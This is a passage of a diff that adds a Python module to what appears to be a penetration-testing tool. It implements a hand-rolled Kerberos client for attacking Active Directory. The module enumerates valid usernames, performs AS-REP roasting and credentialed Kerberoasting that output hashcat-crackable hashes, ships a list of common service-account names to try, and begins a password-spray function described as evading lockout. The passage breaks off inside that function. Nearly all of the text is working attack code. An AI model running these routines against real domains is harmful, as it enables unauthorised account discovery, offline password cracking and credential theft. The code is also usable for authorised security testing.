@@ -1,0 +1,1309 @@
+"""Credential-less Active Directory roasting (stdlib only).
+
+A minimal Kerberos client - hand-rolled ASN.1 DER over TCP 88, no impacket - that
+needs NO credential, only a DC and a list of candidate usernames. For each name it
+sends an AS-REQ with no pre-authentication and reads the KDC's reply:
+
+  * **AS-REP returned** -> the account has "do not require Kerberos pre-auth"
+    (DONT_REQ_PREAUTH) set. recce captures the encrypted part as a crackable
+    `$krb5asrep$` hash - AS-REP roasting with no credential (crack offline -> a real
+    password). CONFIRMED high (critical if the account is privileged).
+  * **KRB-ERROR KDC_ERR_PREAUTH_REQUIRED (25)** -> the username is VALID (pre-auth is
+    enforced). Username enumeration with no credential.
+  * **KRB-ERROR KDC_ERR_C_PRINCIPAL_UNKNOWN (6)** -> the username does not exist.
+
+Candidate usernames come from what recce already enumerated (LDAP / SharpHound user
+accounts in the datastore) or an operator `--userlist`. recce only requests tickets -
+it makes no logon attempt and locks out no account. Findings fold into the severity
+totals, the Vulnerabilities sheet, the write-ups, a dedicated **Kerberos** tab, and
+the prove engine.
+"""
+from __future__ import annotations
+
+import hashlib
+import hmac
+import os
+import shlex
+import socket
+import struct
+import time
+
+from ..core.models import Host, Port
+from ..services.svccommon import finding_builder, recvn as _recvn
+from .ntlm import normalize_nt_hash, nt_hash, rc4k
+
+_PORT = 88
+_TIMEOUT = 6.0
+
+# KRB error codes we care about.
+KDC_ERR_PRINCIPAL_UNKNOWN = 6
+KDC_ERR_CLIENT_REVOKED = 18
+KDC_ERR_KEY_EXPIRED = 23
+KDC_ERR_PREAUTH_FAILED = 24
+KDC_ERR_PREAUTH_REQUIRED = 25
+KRB_AP_ERR_SKEW = 37
+
+# etype numbers; RC4-HMAC (23) first so we get the classic crackable AS-REP.
+_ETYPES = (23, 17, 18)
+
+
+def is_kerberos(port: Port) -> bool:
+    if port.portid == _PORT:
+        return True
+    return "kerberos" in f"{port.service} {port.product}".lower()
+
+
+# --- minimal ASN.1 DER -----------------------------------------------------------
+
+def _der_len(n: int) -> bytes:
+    if n < 0x80:
+        return bytes([n])
+    out = b""
+    while n:
+        out = bytes([n & 0xFF]) + out
+        n >>= 8
+    return bytes([0x80 | len(out)]) + out
+
+
+def _tlv(tag: int, content: bytes) -> bytes:
+    return bytes([tag]) + _der_len(len(content)) + content
+
+
+def _int(n: int) -> bytes:
+    if n == 0:
+        body = b"\x00"
+    elif n > 0:
+        body = b""
+        v = n
+        while v:
+            body = bytes([v & 0xFF]) + body
+            v >>= 8
+        if body[0] & 0x80:                             # keep it positive
+            body = b"\x00" + body
+    else:
+        # Negative INTEGER (e.g. the -138 KERB_CHECKSUM_HMAC_MD5 cksumtype): minimal
+        # two's-complement with the sign bit set. A plain `v >>= 8` loop would spin
+        # forever here (Python's arithmetic shift of a negative converges to -1).
+        nbytes = 1
+        while n < -(1 << (8 * nbytes - 1)):
+            nbytes += 1
+        body = (n & ((1 << (8 * nbytes)) - 1)).to_bytes(nbytes, "big")
+    return _tlv(0x02, body)
+
+
+def _gstr(s: str) -> bytes:
+    return _tlv(0x1B, s.encode("utf-8"))               # GeneralString
+
+
+def _gtime(s: str) -> bytes:
+    return _tlv(0x18, s.encode("ascii"))               # GeneralizedTime
+
+
+def _ctx(n: int, content: bytes) -> bytes:
+    return _tlv(0xA0 | n, content)                     # [n] explicit, constructed
+
+
+def _seq(*items: bytes) -> bytes:
+    return _tlv(0x30, b"".join(items))
+
+
+def _bitstring32(val: int) -> bytes:
+    return _tlv(0x03, b"\x00" + struct.pack(">I", val))
+
+
+def _principal(ntype: int, names: list[str]) -> bytes:
+    return _seq(_ctx(0, _int(ntype)),
+                _ctx(1, _seq(*[_gstr(n) for n in names])))
+
+
+def build_as_req(user: str, realm: str, etypes=_ETYPES,
+                 till: str = "20370913024805Z", nonce: int = 0x7FFFFFFE) -> bytes:
+    """A pre-auth-less AS-REQ for (user, realm). realm should be upper-case."""
+    body = _seq(
+        _ctx(0, _bitstring32(0x40810010)),             # kdc-options (fwd/renew/canon)
+        _ctx(1, _principal(1, [user])),                # cname (NT-PRINCIPAL)
+        _ctx(2, _gstr(realm)),                         # realm
+        _ctx(3, _principal(2, ["krbtgt", realm])),     # sname krbtgt/REALM
+        _ctx(5, _gtime(till)),                          # till
+        _ctx(7, _int(nonce)),                           # nonce
+        _ctx(8, _seq(*[_int(e) for e in etypes])),      # etype
+    )
+    kdc_req = _seq(
+        _ctx(1, _int(5)),                               # pvno
+        _ctx(2, _int(10)),                              # msg-type = AS-REQ
+        _ctx(4, body),                                  # req-body
+    )
+    return _tlv(0x6A, kdc_req)                          # [APPLICATION 10]
+
+
+def _read_tlv(data: bytes, i: int):
+    """Return (tag, content_bytes, next_index) for the DER TLV at `i`."""
+    if i + 2 > len(data):
+        raise ValueError("DER: truncated header")
+    tag = data[i]
+    length = data[i + 1]
+    j = i + 2
+    if length & 0x80:
+        nbytes = length & 0x7F
+        if nbytes == 0 or j + nbytes > len(data):
+            raise ValueError("DER: bad length")
+        length = int.from_bytes(data[j:j + nbytes], "big")
+        j += nbytes
+    if j + length > len(data):
+        raise ValueError("DER: content overruns buffer")
+    return tag, data[j:j + length], j + length
+
+
+def _children(content: bytes):
+    i = 0
+    while i < len(content):
+        tag, val, i = _read_tlv(content, i)
+        yield tag, val
+
+
+def _find(content: bytes, tag: int):
+    for t, val in _children(content):
+        if t == tag:
+            return val
+    return None
+
+
+def _ctx_inner(content: bytes, n: int):
+    """Value inside an explicit [n] context tag (unwrap one TLV), or None."""
+    wrapped = _find(content, 0xA0 | n)
+    if wrapped is None:
+        return None
+    _t, val, _ = _read_tlv(wrapped, 0)
+    return val
+
+
+# --- response parsing ------------------------------------------------------------
+
+def parse_response(data: bytes) -> dict:
+    """Classify a KDC reply. Returns one of:
+        {"type": "asrep", "user", "realm", "etype", "cipher"}
+        {"type": "error", "code": <int>}
+        {"type": "unknown"}
+    """
+    try:
+        tag, body, _ = _read_tlv(data, 0)
+        _t, seq, _ = _read_tlv(body, 0)               # inner SEQUENCE
+        if tag == 0x7E:                                # [APPLICATION 30] KRB-ERROR
+            err = _ctx_inner(seq, 6)                   # error-code [6]
+            code = int.from_bytes(err, "big") if err else -1
+            return {"type": "error", "code": code}
+        if tag == 0x6B:                                # [APPLICATION 11] AS-REP
+            crealm_s = _ctx_inner(seq, 3)              # crealm [3] GeneralString
+            realm = crealm_s.decode("utf-8", "replace") if crealm_s else ""
+            cname = _ctx_inner(seq, 4)                 # cname [4] PrincipalName
+            user = ""
+            if cname:
+                names = _ctx_inner(cname, 1)           # name-string [1] SEQ OF GStr
+                if names:
+                    first = _find(names, 0x1B)
+                    user = first.decode("utf-8", "replace") if first else ""
+            enc = _ctx_inner(seq, 6)                    # enc-part [6] EncryptedData
+            etype, cipher = 0, b""
+            if enc:
+                et = _ctx_inner(enc, 0)                # etype [0] Int32
+                etype = int.from_bytes(et, "big") if et else 0
+                cipher = _ctx_inner(enc, 2) or b""     # cipher [2] OCTET STRING
+            return {"type": "asrep", "user": user, "realm": realm,
+                    "etype": etype, "cipher": cipher}
+    except (ValueError, IndexError):
+        return {"type": "unknown"}
+    return {"type": "unknown"}
+
+
+# --- etype pre-flight (PA-ETYPE-INFO2) ---------------------------------------
+# Kerberoast turns into a crackable hash only when the SPN account issues an
+# RC4 (etype 23) TGS — an AES-only account gives you an AES256 hash that is
+# orders of magnitude harder to crack. `msDS-SupportedEncryptionTypes` on the
+# account tells the KDC which etypes it may use; PA-ETYPE-INFO2 in the KDC's
+# reply reveals what the KDC will actually pick.
+#
+# By RFC 4120 §5.2.7.5, PA-ETYPE-INFO2 arrives inside the e-data of a
+# KRB-ERROR when a pre-auth-less AS-REQ hits an account that requires pre-auth
+# (code 25 = KDC_ERR_PREAUTH_REQUIRED). It is a padata-type 19 entry whose
+# data is a METHOD-DATA carrying PA-ETYPE-INFO2 (SEQUENCE OF
+# ETYPE-INFO2-ENTRY, each { etype [0] Int32, salt [1] KerberosString OPT, ... }).
+#
+# Reading it before requesting a TGS avoids the "roasted an AES-only account,
+# got a useless hash" outcome — the pre-flight is the safest kerberoast prep
+# step and no OSS tool ships it cleanly.
+
+_KRB_ETYPE_NAMES = {
+    1: "des-cbc-crc", 3: "des-cbc-md5",
+    17: "aes128-cts-hmac-sha1-96",
+    18: "aes256-cts-hmac-sha1-96",
+    23: "rc4-hmac", 24: "rc4-hmac-exp",
+}
+_PADATA_ETYPE_INFO2 = 19
+
+
+def _extract_padata(krberror_body: bytes) -> list[tuple[int, bytes]]:
+    """From a KRB-ERROR body, pull the (padata-type, padata-value) entries in
+    the e-data field. e-data is [12] OCTET STRING wrapping a METHOD-DATA
+    (SEQUENCE OF PA-DATA); each PA-DATA is a SEQUENCE with fields
+    padata-type [1] and padata-value [2]."""
+    edata = _ctx_inner(krberror_body, 12)
+    if not edata:
+        return []
+    try:
+        _t, method_data, _ = _read_tlv(edata, 0)
+    except (ValueError, IndexError):
+        return []
+    out = []
+    # METHOD-DATA is SEQUENCE OF PA-DATA. Each PA-DATA child is a SEQUENCE, so
+    # we want the inner value bytes to look up context tags [1] and [2] on.
+    for _tag, pa_body in _children(method_data):
+        try:
+            typ_b = _ctx_inner(pa_body, 1)
+            val_b = _ctx_inner(pa_body, 2)
+            if typ_b and val_b is not None:
+                out.append((int.from_bytes(typ_b, "big"), val_b))
+        except (ValueError, IndexError):
+            continue
+    return out
+
+
+def parse_etype_info2(padata_value: bytes) -> list[dict]:
+    """Decode a PA-ETYPE-INFO2 padata value into [{etype, salt}, ...]."""
+    entries = []
+    try:
+        _t, seq, _ = _read_tlv(padata_value, 0)
+    except (ValueError, IndexError):
+        return entries
+    # SEQUENCE OF ETYPE-INFO2-ENTRY — each child is itself a SEQUENCE whose
+    # inner value carries the context tags.
+    for _tag, entry_body in _children(seq):
+        et_b = _ctx_inner(entry_body, 0)
+        salt_b = _ctx_inner(entry_body, 1)
+        if not et_b:
+            continue
+        entries.append({
+            "etype": int.from_bytes(et_b, "big"),
+            "salt": salt_b.decode("utf-8", "replace") if salt_b else "",
+        })
+    return entries
+
+
+def etype_preflight(dc_ip: str, realm: str, user: str,
+                    timeout: float = 5.0) -> dict:
+    """Query the KDC for the etypes it will use for `user@realm`.
+
+    Sends a pre-auth-less AS-REQ (build_as_req offers RC4+AES) and reads the
+    KRB-ERROR reply. Returns:
+      {"reachable": bool, "code": int, "etypes": [{etype, name, salt}, ...],
+       "has_rc4": bool, "aes_only": bool}
+
+    Only relies on the KDC's own reply. Nothing is decrypted, no credential is
+    tried, no lockout counter is touched (pre-auth-less AS-REQ does not).
+    """
+    out: dict = {"reachable": False, "code": None, "etypes": [],
+                 "has_rc4": False, "aes_only": False}
+    payload = build_as_req(user, realm.upper())
+    reply = _send_recv(dc_ip, payload, timeout)
+    if not reply:
+        return out
+    out["reachable"] = True
+    try:
+        tag, body, _ = _read_tlv(reply, 0)
+        _t, seq, _ = _read_tlv(body, 0)
+    except (ValueError, IndexError):
+        return out
+    if tag != 0x7E:                          # not a KRB-ERROR — nothing to mine
+        return out
+    err = _ctx_inner(seq, 6)
+    out["code"] = int.from_bytes(err, "big") if err else None
+    # PA-ETYPE-INFO2 rides on KDC_ERR_PREAUTH_REQUIRED (25); other errors mean
+    # the account is unknown / disabled / has a different problem and no etype
+    # info is disclosed.
+    entries: list[dict] = []
+    for typ, val in _extract_padata(seq):
+        if typ == _PADATA_ETYPE_INFO2:
+            entries = parse_etype_info2(val)
+            break
+    for e in entries:
+        e["name"] = _KRB_ETYPE_NAMES.get(e["etype"], f"etype-{e['etype']}")
+    out["etypes"] = entries
+    et_set = {e["etype"] for e in entries}
+    out["has_rc4"] = 23 in et_set
+    out["aes_only"] = bool(et_set) and et_set.issubset({17, 18})
+    return out
+
+
+def asrep_hash(user: str, realm: str, etype: int, cipher: bytes) -> str:
+    """Format an AS-REP cipher as a crackable hash. etype 23 (RC4) -> hashcat 18200
+    `$krb5asrep$23$user@REALM:<checksum>$<edata>`; other etypes -> a generic form."""
+    if etype == 23 and len(cipher) >= 16:
+        return (f"$krb5asrep$23${user}@{realm}:"
+                f"{cipher[:16].hex()}${cipher[16:].hex()}")
+    return f"$krb5asrep${etype}${user}@{realm}${cipher.hex()}"
+
+
+# --- transport -------------------------------------------------------------------
+
+def _send_recv(dc_ip: str, payload: bytes, timeout: float) -> bytes | None:
+    """Kerberos over TCP: 4-byte length prefix + message, both directions."""
+    try:
+        sock = socket.create_connection((dc_ip, _PORT), timeout=timeout)
+    except OSError:
+        return None
+    try:
+        sock.settimeout(timeout)
+        sock.sendall(struct.pack(">I", len(payload)) + payload)
+        hdr = _recvn(sock, 4, timeout)
+        if hdr is None:
+            return None
+        n = struct.unpack(">I", hdr)[0]
+        if n == 0 or n > 4 * 1024 * 1024:
+            return None
+        return _recvn(sock, n, timeout)
+    except OSError:
+        return None
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+
+
+def roast_user(dc_ip: str, realm: str, user: str,
+               timeout: float = _TIMEOUT) -> dict:
+    """AS-REQ one user. Returns {user, state, hash?, etype?, code?} where state is
+    'roastable' | 'valid' | 'unknown_user' | 'locked' | 'error' | 'no_reply'."""
+    realm = realm.upper()
+    reply = _send_recv(dc_ip, build_as_req(user, realm), timeout)
+    if reply is None:
+        return {"user": user, "state": "no_reply"}
+    r = parse_response(reply)
+    if r["type"] == "asrep":
+        return {"user": user, "state": "roastable", "etype": r["etype"],
+                "hash": asrep_hash(user, realm, r["etype"], r["cipher"])}
+    if r["type"] == "error":
+        code = r["code"]
+        if code == KDC_ERR_PREAUTH_REQUIRED:
+            return {"user": user, "state": "valid", "code": code}
+        if code == KDC_ERR_PRINCIPAL_UNKNOWN:
+            return {"user": user, "state": "unknown_user", "code": code}
+        if code in (KDC_ERR_CLIENT_REVOKED, KDC_ERR_KEY_EXPIRED):
+            return {"user": user, "state": "locked", "code": code}
+        return {"user": user, "state": "error", "code": code}
+    return {"user": user, "state": "unknown"}
+
+
+# ============================================================================
+# Credentialed Kerberoasting (RC4-HMAC / etype 23) - stdlib, no impacket.
+#
+# With ANY valid domain credential, request a service ticket (TGS) for each SPN
+# and capture its enc-part - encrypted with the service account's key - as a
+# crackable $krb5tgs$23$ hash. Flow (RFC 4120): AS-REQ with PA-ENC-TIMESTAMP ->
+# TGT + session key (decrypt the AS-REP), then a TGS-REQ whose AP-REQ carries an
+# authenticator with a KERB_CHECKSUM_HMAC_MD5 (-138) checksum over the request
+# body. impacket's GetUserSPNs trips over that checksum against a Samba KDC
+# (KRB_AP_ERR_INAPP_CKSUM) where a native RC4 client works; this is that native
+# client. RC4-only (etype 23) - the classic crackable hash and stdlib-friendly
+# (no AES in the standard library). The crypto matches impacket's byte-for-byte
+# (tests/test_kerberoast.py); only the protocol choice differs.
+# ============================================================================
+
+_U_AS_REQ_PA_ENC_TS = 1        # PA-ENC-TIMESTAMP, client key
+_U_AS_REP_ENCPART = 3          # AS-REP enc-part, client key
+_U_TGS_REQ_AUTH_CKSUM = 6      # authenticator cksum over req-body, TGT session key
+_U_TGS_REQ_AUTH = 7            # authenticator, TGT session key
+CKSUM_HMAC_MD5 = -138          # KERB_CHECKSUM_HMAC_MD5
+ETYPE_RC4 = 23
+
+
+def _hmd5(key: bytes, data: bytes) -> bytes:
+    return hmac.new(key, data, hashlib.md5).digest()
+
+
+def _rc4_usage(usage: int) -> int:
+    # RFC 4757 usage export (per the errata: do NOT map 9 to 8).
+    return {3: 8, 23: 13}.get(usage, usage)
+
+
+def rc4_encrypt(key: bytes, usage: int, plaintext: bytes,
+                confounder: bytes | None = None) -> bytes:
+    """RC4-HMAC (arcfour-hmac-md5) encrypt. Matches impacket's _RC4.encrypt."""
+    ki = _hmd5(key, struct.pack("<I", _rc4_usage(usage)))
+    if confounder is None:
+        confounder = os.urandom(8)
+    data = confounder + plaintext
+    cksum = _hmd5(ki, data)
+    ke = _hmd5(ki, cksum)
+    return cksum + rc4k(ke, data)
+
+
+def rc4_decrypt(key: bytes, usage: int, ciphertext: bytes) -> bytes:
+    """RC4-HMAC decrypt with integrity check. Raises ValueError on tampering."""
+    if len(ciphertext) < 24:
+        raise ValueError("RC4-HMAC ciphertext too short")
+    ki = _hmd5(key, struct.pack("<I", _rc4_usage(usage)))
+    cksum, body = ciphertext[:16], ciphertext[16:]
+    ke = _hmd5(ki, cksum)
+    data = rc4k(ke, body)
+    if not hmac.compare_digest(_hmd5(ki, data), cksum):
+        raise ValueError("RC4-HMAC integrity failure")
+    return data[8:]                                    # strip the 8-byte confounder
+
+
+def krb_checksum_hmacmd5(key: bytes, usage: int, data: bytes) -> bytes:
+    """KERB_CHECKSUM_HMAC_MD5 (-138). Matches impacket's _HMACMD5.checksum."""
+    ksign = _hmd5(key, b"signaturekey\0")
+    return _hmd5(ksign, hashlib.md5(struct.pack("<I", _rc4_usage(usage)) + data).digest())
+
+
+# --- extra DER helpers (build on the AS-REP-roast primitives above) --------------
+
+def _octet(b: bytes) -> bytes:
+    return _tlv(0x04, b)
+
+
+def _krbtime(offset: int = 0) -> str:
+    return time.strftime("%Y%m%d%H%M%SZ", time.gmtime(time.time() + offset))
+
+
+def _encrypted_data(etype: int, cipher: bytes) -> bytes:
+    """EncryptedData ::= SEQUENCE { etype[0], cipher[2] } (no kvno)."""
+    return _seq(_ctx(0, _int(etype)), _ctx(2, _octet(cipher)))
+
+
+def _req_body(realm: str, sname: bytes, cname: bytes | None,
+              etypes=(ETYPE_RC4,), nonce: int = 0x6F6F6F6F) -> bytes:
+    """KDC-REQ-BODY. cname is present for AS-REQ, omitted for TGS-REQ."""
+    parts = [_ctx(0, _bitstring32(0x40810010))]        # kdc-options
+    if cname is not None:
+        parts.append(_ctx(1, cname))
+    parts += [
+        _ctx(2, _gstr(realm)),
+        _ctx(3, sname),
+        _ctx(5, _gtime("20370913024805Z")),            # till
+        _ctx(7, _int(nonce)),
+        _ctx(8, _seq(*[_int(e) for e in etypes])),
+    ]
+    return _seq(*parts)
+
+
+# --- AS-REQ (pre-auth) -> TGT + session key --------------------------------------
+
+def _build_as_req_preauth(user: str, realm: str, key: bytes) -> bytes:
+    """A pre-authenticated AS-REQ: proves knowledge of the client key with an
+    encrypted timestamp, so the KDC returns a usable TGT."""
+    pa_ts_enc = _seq(_ctx(0, _gtime(_krbtime())))      # PA-ENC-TS-ENC { patimestamp[0] }
+    enc = rc4_encrypt(key, _U_AS_REQ_PA_ENC_TS, pa_ts_enc)
+    pa_enc_ts = _seq(_ctx(1, _int(2)),                 # PA-DATA: type 2 (PA-ENC-TIMESTAMP)
+                     _ctx(2, _octet(_encrypted_data(ETYPE_RC4, enc))))
+    padata = _seq(pa_enc_ts)                           # SEQUENCE OF PA-DATA
+    body = _req_body(realm, _principal(2, ["krbtgt", realm]), _principal(1, [user]))
+    kdc_req = _seq(_ctx(1, _int(5)), _ctx(2, _int(10)), _ctx(3, padata), _ctx(4, body))
+    return _tlv(0x6A, kdc_req)                          # [APPLICATION 10] AS-REQ
+
+
+def _parse_asrep_tgt(data: bytes, key: bytes) -> tuple[bytes, bytes]:
+    """From an AS-REP: return (raw TGT [APPLICATION 1] Ticket, TGT session key)."""
+    _tag, body, _ = _read_tlv(data, 0)                 # [APPLICATION 11]
+    _t, seq, _ = _read_tlv(body, 0)                    # inner SEQUENCE
+    tgt = _find(seq, 0xA0 | 5)                          # ticket[5] -> the Ticket TLV, verbatim
+    enc = _ctx_inner(seq, 6)                            # enc-part[6] EncryptedData
+    if tgt is None or enc is None:
+        raise ValueError("AS-REP missing ticket/enc-part")
+    cipher = _ctx_inner(enc, 2) or b""
+    dec = rc4_decrypt(key, _U_AS_REP_ENCPART, cipher)  # EncASRepPart [APPLICATION 25/26]
+    _t2, encseq, _ = _read_tlv(dec, 0)                 # unwrap the APPLICATION tag
+    _t3, kdcrep, _ = _read_tlv(encseq, 0)              # inner SEQUENCE (EncKDCRepPart)
+    keyfld = _ctx_inner(kdcrep, 0)                     # key[0] EncryptionKey
+    sesskey = _ctx_inner(keyfld, 1) if keyfld else None    # keyvalue[1]
+    if not sesskey:
+        raise ValueError("AS-REP enc-part missing session key")
+    return tgt, sesskey
+
+
+# --- TGS-REQ -> service ticket ---------------------------------------------------
+
+def _build_tgs_req(realm: str, user: str, spn: str, tgt: bytes, session_key: bytes) -> bytes:
+    # Request RC4 preferred but AES (17/18) as fallback: an account with RC4 disabled
+    # (msDS-SupportedEncryptionTypes = AES-only, increasingly the default) would answer
+    # an RC4-only request with KDC_ERR_ETYPE_NOSUPP and be silently missed. tgs_hash
+    # formats whichever etype the KDC returns.
+    body = _req_body(realm, _principal(2, spn.split("/")), None, etypes=_ETYPES)
+    cksum_val = krb_checksum_hmacmd5(session_key, _U_TGS_REQ_AUTH_CKSUM, body)
+    cksum = _seq(_ctx(0, _int(CKSUM_HMAC_MD5)), _ctx(1, _octet(cksum_val)))
+    authenticator = _tlv(0x62, _seq(                   # [APPLICATION 2] Authenticator
+        _ctx(0, _int(5)),                              # authenticator-vno
+        _ctx(1, _gstr(realm)),                         # crealm
+        _ctx(2, _principal(1, [user])),               # cname
+        _ctx(3, cksum),                                # cksum
+        _ctx(4, _int(0)),                              # cusec
+        _ctx(5, _gtime(_krbtime())),                   # ctime
+    ))
+    enc_auth = rc4_encrypt(session_key, _U_TGS_REQ_AUTH, authenticator)
+    ap_req = _tlv(0x6E, _seq(                           # [APPLICATION 14] AP-REQ
+        _ctx(0, _int(5)),                              # pvno
+        _ctx(1, _int(14)),                             # msg-type
+        _ctx(2, _bitstring32(0)),                      # ap-options
+        _ctx(3, tgt),                                  # ticket (the TGT, verbatim)
+        _ctx(4, _encrypted_data(ETYPE_RC4, enc_auth)),  # authenticator
+    ))
+    padata = _seq(_seq(_ctx(1, _int(1)),               # PA-DATA: type 1 (PA-TGS-REQ)
+                       _ctx(2, _octet(ap_req))))
+    kdc_req = _seq(_ctx(1, _int(5)), _ctx(2, _int(12)), _ctx(3, padata), _ctx(4, body))
+    return _tlv(0x6C, kdc_req)                          # [APPLICATION 12] TGS-REQ
+
+
+def _parse_tgsrep_ticket(data: bytes) -> tuple[int, bytes]:
+    """From a TGS-REP: return (etype, cipher) of the service ticket's enc-part -
+    encrypted with the service account's key, i.e. the crackable material."""
+    _tag, body, _ = _read_tlv(data, 0)                 # [APPLICATION 13]
+    _t, seq, _ = _read_tlv(body, 0)
+    tkt = _find(seq, 0xA0 | 5)                          # ticket[5] -> Ticket [APPLICATION 1]
+    if tkt is None:
+        raise ValueError("TGS-REP missing ticket")
+    _tt, tkt_seq, _ = _read_tlv(tkt, 0)                # unwrap [APPLICATION 1]
+    _ts, tkt_inner, _ = _read_tlv(tkt_seq, 0)          # inner SEQUENCE
+    enc = _ctx_inner(tkt_inner, 3)                     # enc-part[3] EncryptedData
+    if enc is None:
+        raise ValueError("service ticket missing enc-part")
+    et = _ctx_inner(enc, 0)
+    cipher = _ctx_inner(enc, 2) or b""
+    return (int.from_bytes(et, "big") if et else 0), cipher
+
+
+def tgs_hash(user: str, realm: str, spn: str, etype: int, cipher: bytes) -> str:
+    """Format a service ticket's enc-part as a hashcat-crackable hash. etype 23 ->
+    $krb5tgs$23$ (hashcat -m 13100): the 16-byte RC4-HMAC checksum leads the cipher."""
+    if etype == ETYPE_RC4 and len(cipher) >= 16:
+        return (f"$krb5tgs$23$*{user}${realm}${spn}*$"
+                f"{cipher[:16].hex()}${cipher[16:].hex()}")
+    # AES (17=aes128 -> hashcat 19600, 18=aes256 -> 19700): the 12-byte HMAC tag trails
+    # the ciphertext but the hash string leads with it, and user/realm sit OUTSIDE the
+    # *spn* asterisks (impacket GetUserSPNs layout) - the generic dump wasn't crackable.
+    if etype in (17, 18) and len(cipher) >= 12:
+        return (f"$krb5tgs${etype}${user}${realm}$*{spn}*$"
+                f"{cipher[-12:].hex()}${cipher[:-12].hex()}")
+    return f"$krb5tgs${etype}$*{user}${realm}${spn}*${cipher.hex()}"
+
+
+def _kdc_error_code(data: bytes) -> int | None:
+    """If the reply is a KRB-ERROR, its error-code; else None."""
+    try:
+        tag, body, _ = _read_tlv(data, 0)
+        if tag != 0x7E:                                # [APPLICATION 30] KRB-ERROR
+            return None
+        _t, seq, _ = _read_tlv(body, 0)
+        err = _ctx_inner(seq, 6)
+        return int.from_bytes(err, "big") if err else -1
+    except (ValueError, IndexError):
+        return None
+
+
+def client_key(password: str = "", nthash: str = "") -> bytes:
+    """The RC4 (etype 23) client key: the NT hash, from a password or a pass-the-hash
+    hex string (LM:NT or bare NT)."""
+    return normalize_nt_hash(nthash) if nthash else nt_hash(password)
+
+
+def kerberoast_spn(dc_ip: str, realm: str, auth_user: str, key: bytes, spn: str,
+                   spn_user: str = "", timeout: float = _TIMEOUT) -> dict:
+    """Roast one SPN with a valid credential. Returns
+    {spn, user, state, hash?, etype?, code?} where state is
+    'roasted' | 'bad_creds' | 'no_spn' | 'error' | 'no_reply'."""
+    realm = realm.upper()
+    label = spn_user or spn.split("/")[0]
+    as_reply = _send_recv(dc_ip, _build_as_req_preauth(auth_user, realm, key), timeout)
+    if as_reply is None:
+        return {"spn": spn, "user": label, "state": "no_reply"}
+    code = _kdc_error_code(as_reply)
+    if code is not None:                               # AS exchange failed (bad creds, etc.)
+        state = "bad_creds" if code in (24, 25, 18, 23, 6) else "error"
+        return {"spn": spn, "user": label, "state": state, "code": code}
+    try:
+        tgt, session_key = _parse_asrep_tgt(as_reply, key)
+    except ValueError:
+        return {"spn": spn, "user": label, "state": "error"}
+    tgs_reply = _send_recv(dc_ip, _build_tgs_req(realm, auth_user, spn, tgt, session_key),
+                           timeout)
+    if tgs_reply is None:
+        return {"spn": spn, "user": label, "state": "no_reply"}
+    code = _kdc_error_code(tgs_reply)
+    if code is not None:                               # 7 = S_PRINCIPAL_UNKNOWN (no such SPN)
+        return {"spn": spn, "user": label,
+                "state": "no_spn" if code == 7 else "error", "code": code}
+    try:
+        etype, cipher = _parse_tgsrep_ticket(tgs_reply)
+    except ValueError:
+        return {"spn": spn, "user": label, "state": "error"}
+    return {"spn": spn, "user": label, "state": "roasted", "etype": etype,
+            "hash": tgs_hash(label, realm, spn, etype, cipher)}
+
+
+def kerberoast(dc_ip: str, realm: str, auth_user: str, key: bytes,
+               targets: list[dict], timeout: float = _TIMEOUT) -> list[dict]:
+    """Roast a list of SPN targets [{spn, user?}] with one credential (one TGT is
+    fetched per SPN for simplicity/robustness). Returns per-target result dicts."""
+    out = []
+    for t in targets:
+        spn = t.get("spn") or ""
+        if not spn:
+            continue
+        out.append(kerberoast_spn(dc_ip, realm, auth_user, key, spn,
+                                  spn_user=t.get("user", ""), timeout=timeout))
+    return out
+
+
+# --- candidate users / realm / DC ------------------------------------------------
+
+def candidate_users(hosts: list[Host]) -> list[str]:
+    """Distinct user account names recce already enumerated (LDAP / SharpHound)."""
+    seen, out = set(), []
+    for h in hosts:
+        for a in getattr(h, "accounts", None) or []:
+            if getattr(a, "kind", "") == "user" and a.name:
+                low = a.name.lower()
+                if low not in seen and "$" not in a.name:      # skip machine accounts
+                    seen.add(low)
+                    out.append(a.name)
+    return out
+
+
+# Well-known AD user + service names, tried when the enumerated account list
+# is empty (no LDAP enum yet). Kept short — this is "check the classics",
+# not brute-force. AS-REQ per name is one TCP connection to the DC.
+_WELL_KNOWN_USERS = [
+    # Default / typical admin
+    "administrator", "admin", "guest",
+    # Common service accounts
+    "krbtgt", "svc_mssql", "svc-mssql", "sql_svc", "svc_sql", "sqlsvc",
+    "svc_ldap", "svc-ldap", "svc_web", "svc-web", "svc_backup", "svc-backup",
+    "svc_scan", "svc-scan", "svc_iis", "svc_smb",
+    # Typical operator names
+    "sysadmin", "helpdesk", "backup", "operator", "printer",
+    # Vendor defaults
+    "veeam", "sccm", "exchange", "sharepoint",
+]
+
+
+def well_known_users() -> list[str]:
+    """Fallback user list for `analyze()` when nothing has been enumerated
+    yet — the classic default and service names. Copy is intentional (caller
+    may mutate)."""
+    return list(_WELL_KNOWN_USERS)
+
+
+def dc_ip_for(hosts: list[Host]) -> str:
+    for h in hosts:
+        if any(is_kerberos(p) for p in h.open_ports):
+            return h.ip
+    return ""
+
+
+# --- pre-auth password spray + passive KDC probe --------------------------------
+# Two additions that stand on the RC4 primitives already in this module.
+#
+# 1) spray_user / spray: send a pre-authenticated AS-REQ (PA-ENC-TIMESTAMP) with
+#    a candidate password/NT hash. KDC_ERR_PREAUTH_FAILED (24) means the
+#    password is wrong; an AS-REP means it is correct. The failure event is
+#    4771 on the DC (NOT 4625), and by default this does NOT increment the SMB
+#    lockout counter — the quietest domain spray primitive available. Chains
+#    directly off user_enum: recce confirms usernames, then sprays here.
+#
+# 2) kdc_probe: one pre-auth-less AS-REQ, mine the KRB-ERROR reply for passive
+#    facts — the KDC's stime (RFC 4120 §5.9.1, an unauthenticated clock oracle
+#    and drift detector), crealm (authoritative realm), and any advertised
+#    padata types. PA-FX-FAST (RFC 6113 padata type 136) advertised means the
+#    KDC enforces FAST armouring — spraying is defeated for that account and
+#    AS-REP roasting is the ONLY remaining credential-less path.
+
+_PADATA_FX_FAST = 136
+
+
+def spray_user(dc_ip: str, realm: str, user: str, password: str = "",
+               nthash: str = "", timeout: float = _TIMEOUT) -> dict:
+    """Pre-auth AS-REQ for (user@realm) with a candidate password or NT hash.
+    Returns {user, state, code?} where state is 'success' | 'bad_password' |
+    'locked' | 'unknown_user' | 'error' | 'no_reply'."""
+    realm = realm.upper()
+    key = client_key(password=password, nthash=nthash)
+    reply = _send_recv(dc_ip, _build_as_req_preauth(user, realm, key), timeout)
+    if reply is None:
+        return {"user": user, "state": "no_reply"}
+    try:
+        tag, _body, _ = _read_tlv(reply, 0)
+    except (ValueError, IndexError):
